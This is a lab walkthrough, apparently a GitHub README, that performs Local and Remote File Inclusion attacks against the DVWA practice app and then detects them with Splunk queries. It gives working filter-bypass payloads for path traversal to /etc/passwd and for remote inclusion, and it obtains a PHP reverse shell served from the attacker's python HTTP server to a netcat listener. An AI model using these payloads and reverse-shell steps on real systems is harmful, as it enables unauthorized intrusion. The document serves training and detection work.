For file inclusion we need to have reverse shell, we will download it from this github link
https://github.com/pentestmonkey/php-reverse-shell

After downloading we have to change the ip address inside to attackers ip a and specify a port

Now we will start the attack

There are two kinds of attack possible Local File Inclusion (LFI) and Remote File Inclusion (RFI)

First we will try LFI 

![image](https://github.com/user-attachments/assets/bc470318-13eb-4d4b-b755-d9b1f28ca6ad)

It says that the source will replace any `../` file found in the string so we will modify the url into `..//..//..//..//../etc/passwd`


![Screenshot 2025-06-17 144501](https://github.com/user-attachments/assets/568655b9-6588-4a3a-a9c7-cdc48c69ef52)

Now RFI

first we will bind python to the attacker server ```python -m http.server --bind 172.17.128.157```

![image](https://github.com/user-attachments/assets/e703f11d-ba54-44f8-83c3-ec251790929c)

 now use netcat and listen on the port that we gave earlier in the php file

 ![image](https://github.com/user-attachments/assets/50613436-1774-499d-b8ac-2764e8064b3e)

now we will open the website we got after python binding, if we were already in the directory that contains php file it will be shown,else move to that directory

![image](https://github.com/user-attachments/assets/28619565-a598-44e3-a91c-368cca320f80)

now we will select the reverse shell url and try to access it with victim dvwa url

![image](https://github.com/user-attachments/assets/7d5ea201-4439-4a2b-98cc-f5166d7c0129)

![image](https://github.com/user-attachments/assets/b58060a1-e0b1-4bba-a934-9f196391855e)

when adding the `http://` the browser will replace that value so we have to include it inside another http command `httphttp://://`

After ciclking enter we can see the reverse shell access has been gained

![image](https://github.com/user-attachments/assets/cb79f08c-a377-4896-9f25-92acc5748135)


Now to detect through splunk

We ccan detect LFI by checking if any path traversal commands were executed 

```
sourcetype=access_combined 
| where like(uri, "%../%") OR like(uri_query, "%../%")
```

![image](https://github.com/user-attachments/assets/9d957ceb-5c41-4a74-a9d4-a00878e5aff0)

```
sourcetype=access_combined 
| regex uri_query="(http|https):\/\/.*\.(php|txt|jpg|gif|png)"
```

with this command we can understadn some malicious https site was accessed,which is the attacker's local directory.The attacker tried to circumvent the http replacement by adding additional values,also the accessed file is php that is also an indication the file inclusion attack could have happened

![image](https://github.com/user-attachments/assets/e31f800b-cf18-4259-8e18-8372b3368762)
